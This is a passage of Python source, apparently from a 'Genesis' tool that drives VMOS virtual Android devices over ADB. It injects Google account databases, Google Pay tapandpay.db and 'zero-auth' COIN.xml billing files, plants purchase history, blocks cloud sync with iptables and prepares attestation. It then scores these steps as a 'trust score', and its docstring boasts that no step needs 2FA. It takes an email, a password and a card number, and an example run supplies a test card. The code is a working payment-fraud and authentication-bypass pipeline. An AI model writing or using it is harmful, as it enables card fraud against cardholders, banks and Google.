          - accounts_ce.db + accounts_de.db present:  12 pts
          - tapandpay.db present (dual-path):          8 pts
          - COIN.xml (8-flag zero-auth) present:       8 pts
          - Wallet UI tokenization (10 bypass files): 15 pts
          - Settings provider configured:              8 pts
          - library.db (purchase history) present:     8 pts
          - UUID coherence (instrument_id set):        8 pts
          - Cloud sync defeated (iptables):            8 pts
          - Attestation prepared:                      5 pts
          - Post-injection app restart:                4 pts
          - GMS/GSF shared prefs present:              4 pts
        
        No phase requires 2FA or UI interaction. Score of 100/100
        is fully achievable through pure filesystem injection.
        """
        self._set_phase(ExecutionPhase.VERIFICATION, 0.0)
        self._log("Phase 10: Comprehensive verification (target: 100/100)...")
        
        try:
            score = 0
            checks = []
            
            # ── 1. Authentication (12 pts) ────────────────────────────
            if "authentication" in self.result.phases_completed:
                score += 12
                checks.append(("✓ Authentication completed", 12))
            else:
                checks.append(("✗ Authentication not completed", 0))
            
            # ── 2. Account databases (12 pts) ─────────────────────────
            acct_ok = await self._file_exists("/data/system_ce/0/accounts_ce.db")
            acct_de_ok = await self._file_exists("/data/system_de/0/accounts_de.db")
            if acct_ok and acct_de_ok:
                score += 12
                checks.append(("✓ accounts_ce.db + accounts_de.db present", 12))
            elif acct_ok:
                score += 8
                checks.append(("~ accounts_ce.db present, accounts_de.db missing", 8))
            else:
                checks.append(("✗ Account databases missing", 0))
            
            # ── 3. tapandpay.db dual-path (8 pts) ────────────────────
            if self.config.cc_number:
                gms_tap = await self._file_exists("/data/data/com.google.android.gms/databases/tapandpay.db")
                wallet_tap = await self._file_exists("/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db")
                if gms_tap and wallet_tap:
                    score += 8
                    checks.append(("✓ tapandpay.db dual-path (GMS + Wallet)", 8))
                elif gms_tap:
                    score += 5
                    checks.append(("~ tapandpay.db GMS only (Wallet app missing)", 5))
                else:
                    checks.append(("✗ tapandpay.db missing", 0))
            else:
                score += 8
                checks.append(("○ tapandpay.db skipped (no card)", 8))
            
            # ── 4. COIN.xml zero-auth dual-path (8 pts) ──────────────
            if self.config.cc_number:
                vending_coin = await self._file_exists("/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml")
                gms_coin = await self._file_exists("/data/data/com.google.android.gms/shared_prefs/COIN.xml")
                if vending_coin and gms_coin:
                    score += 8
                    checks.append(("✓ COIN.xml dual-path (Vending + GMS)", 8))
                elif vending_coin or gms_coin:
                    score += 5
                    checks.append(("~ COIN.xml single-path only", 5))
                else:
                    checks.append(("✗ COIN.xml missing", 0))
            else:
                score += 8
                checks.append(("○ COIN.xml skipped (no card)", 8))
            
            # ── 5. Wallet UI tokenization (15 pts) ───────────────────
            if self.result.wallet_ui_tokenized and self.result.wallet_ui_files_injected >= 10:
                score += 15
                checks.append((f"✓ Wallet UI tokenization ({self.result.wallet_ui_files_injected} files)", 15))
            elif self.result.wallet_ui_tokenized:
                partial = int(15 * self.result.wallet_ui_files_injected / 10)
                score += partial
                checks.append((f"~ Wallet UI partial ({self.result.wallet_ui_files_injected}/10 files)", partial))
            elif not self.config.cc_number:
                score += 15
                checks.append(("○ Wallet UI skipped (no card)", 15))
            else:
                checks.append(("✗ Wallet UI tokenization not done", 0))
            
            # ── 6. Settings provider (8 pts) ──────────────────────────
            if self.result.settings_commands_run >= 8:
                score += 8
                checks.append((f"✓ Settings provider configured ({self.result.settings_commands_run} cmds)", 8))
            elif self.result.settings_commands_run > 0:
                partial = int(8 * self.result.settings_commands_run / 8)
                score += partial
                checks.append((f"~ Settings partial ({self.result.settings_commands_run}/8 cmds)", partial))
            elif not self.config.cc_number:
                score += 8
                checks.append(("○ Settings skipped (no card)", 8))
            else:
                checks.append(("✗ Settings provider not configured", 0))
            
            # ── 7. library.db purchase history (8 pts) ────────────────
            if await self._file_exists("/data/data/com.android.vending/databases/library.db"):
                score += 8
                checks.append(("✓ library.db (purchase history) present", 8))
            else:
                checks.append(("✗ library.db missing", 0))
            
            # ── 8. UUID coherence (8 pts) ─────────────────────────────
            if self.result.instrument_id:
                score += 8
                checks.append((f"✓ UUID coherence chain: {self.result.instrument_id}", 8))
            elif not self.config.cc_number:
                score += 8
                checks.append(("○ UUID coherence skipped (no card)", 8))
            else:
                checks.append(("✗ No instrument_id for UUID coherence", 0))
            
            # ── 9. Cloud sync defeated (8 pts) ────────────────────────
            if self.result.cloud_sync_defeated:
                score += 8
                checks.append((f"✓ Cloud sync defeated ({self.result.iptables_rules} iptables rules)", 8))
            elif "post_harden" in self.result.phases_completed:
                score += 4
                checks.append(("~ Post-harden done but iptables partial", 4))
            else:
                checks.append(("✗ Cloud sync not defeated", 0))
            
            # ── 10. Attestation (5 pts) ───────────────────────────────
            if self.result.attestation_tier in ("DEVICE", "BASIC"):
                score += 5
                checks.append((f"✓ Attestation: {self.result.attestation_tier} tier", 5))
            else:
                checks.append(("✗ Attestation not prepared", 0))
            
            # ── 11. App restart cycle (4 pts) ─────────────────────────
            if "app_restart" in self.result.phases_completed:
                score += 4
                checks.append(("✓ Post-injection app restart completed", 4))
            else:
                checks.append(("✗ App restart not done", 0))
            
            # ── 12. GMS/GSF shared prefs (4 pts) ─────────────────────
            gms_reg = await self._file_exists("/data/data/com.google.android.gms/shared_prefs/device_registration.xml")
            gsf_prefs = await self._file_exists("/data/data/com.google.android.gsf/shared_prefs/gservices.xml")
            if gms_reg and gsf_prefs:
                score += 4
                checks.append(("✓ GMS/GSF shared prefs present", 4))
            elif gms_reg or gsf_prefs:
                score += 2
                checks.append(("~ GMS/GSF partial", 2))
            else:
                checks.append(("✗ GMS/GSF shared prefs missing", 0))
            
            # ── Final scoring ──────────────────────────────────────────
            self.result.trust_score = min(score, 100)
            
            for check_msg, pts in checks:
                self._log(f"  {check_msg} [{pts}/pts]")
            
            grade = (
                "A+" if score >= 95 else
                "A" if score >= 85 else
                "B" if score >= 70 else
                "C" if score >= 55 else
                "D" if score >= 40 else
                "F"
            )
            self._log(f"Trust score: {self.result.trust_score}/100 ({grade})")
            self.result.phases_completed.append("verification")
            
        except Exception as e:
            self._log(f"Verification error: {e}", "error")
            self.result.phases_failed.append("verification")
    
    def _finalize_result(self):
        """Calculate final execution result."""
        self._set_phase(ExecutionPhase.COMPLETE, 1.0)
        
        self.result.execution_time_seconds = time.time() - self._start_time
        
        # Success if no critical phases failed
        critical_failures = set(self.result.phases_failed) & {"authentication", "account_injection"}
        self.result.success = len(critical_failures) == 0 and len(self.result.phases_completed) >= 3
        
        self._log(f"Genesis {'COMPLETE' if self.result.success else 'FAILED'}: "
                 f"{len(self.result.phases_completed)} phases completed, "
                 f"{len(self.result.phases_failed)} failed, "
                 f"trust={self.result.trust_score}/100, "
                 f"time={self.result.execution_time_seconds:.1f}s")
    
    # ── Helper methods ──────────────────────────────────────────────────
    
    async def _execute_shell(self, cmd: str, timeout: int = 30) -> str:
        """Execute shell command on device."""
        if not self.client:
            self._log(f"[MOCK] Shell: {cmd[:60]}...")
            return "OK"
        
        try:
            result = await self.client.async_adb_cmd(self.config.pad_code, cmd, timeout=timeout)
            return result.get("output", "")
        except Exception as e:
            self._log(f"Shell error: {e}", "warning")
            return ""
    
    async def _push_database(self, data: bytes, path: str, owner: str = "", mode: str = "660") -> bool:
        """Push database to device using base64 bridge protocol."""
        if not self.client:
            self._log(f"[MOCK] Push DB: {path} ({len(data)} bytes)")
            return True
        
        try:
            from vmos_file_pusher import VMOSFilePusher
            
            pusher = VMOSFilePusher(self.client, self.config.pad_code)
            success = await pusher.push_bytes(data, path)
            
            if success and owner:
                await self._execute_shell(f"chown {owner} {path}")
            if success and mode:
                await self._execute_shell(f"chmod {mode} {path}")
            if success:
                await self._execute_shell(f"restorecon {path} 2>/dev/null")
            
            return success
            
        except Exception as e:
            self._log(f"Push error: {e}", "error")
            return False
    
    async def _push_file(self, data: bytes, path: str, owner: str = "", mode: str = "660") -> bool:
        """Push file to device."""
        return await self._push_database(data, path, owner, mode)
    
    async def _file_exists(self, path: str) -> bool:
        """Check if file exists on device."""
        if not self.client:
            return True  # Assume success in mock mode
        
        result = await self._execute_shell(f"test -f {path} && echo EXISTS || echo MISSING")
        return "EXISTS" in result


# ── Convenience function ──────────────────────────────────────────────────────

async def run_genesis(
    pad_code: str,
    email: str,
    password: str,
    cc_number: str = "",
    cc_exp_month: int = 12,
    cc_exp_year: int = 2029,
    cc_holder: str = "",
    **kwargs
) -> ExecutionResult:
    """
    Convenience function to run Genesis pipeline.
    
    Args:
        pad_code: VMOS device pad code
        email: Google account email
        password: Account password or app password
        cc_number: Credit card number (optional)
        cc_exp_month: Card expiry month
        cc_exp_year: Card expiry year
        cc_holder: Cardholder name
        **kwargs: Additional ExecutorConfig options
        
    Returns:
        ExecutionResult with detailed status
    """
    config = ExecutorConfig(
        pad_code=pad_code,
        google_email=email,
        google_password=password,
        cc_number=cc_number,
        cc_exp_month=cc_exp_month,
        cc_exp_year=cc_exp_year,
        cc_holder=cc_holder or email.split("@")[0].replace(".", " ").title(),
        **kwargs
    )
    
    executor = GenesisExecutor(config)
    return await executor.execute()


if __name__ == "__main__":
    import sys
    
    async def main():
        # Example usage with test device
        result = await run_genesis(
            pad_code="APP5AU4BB1QQBHNA",
            email="test@gmail.com",
            password="test-password",
            cc_number="4532015112830366",
            cc_holder="Test User",
            verbose=True,
        )
        
        print("\n" + "="*60)
        print("GENESIS EXECUTION RESULT")
        print("="*60)
        print(json.dumps(result.to_dict(), indent=2))
        
        return 0 if result.success else 1
    
    sys.exit(asyncio.run(main()))
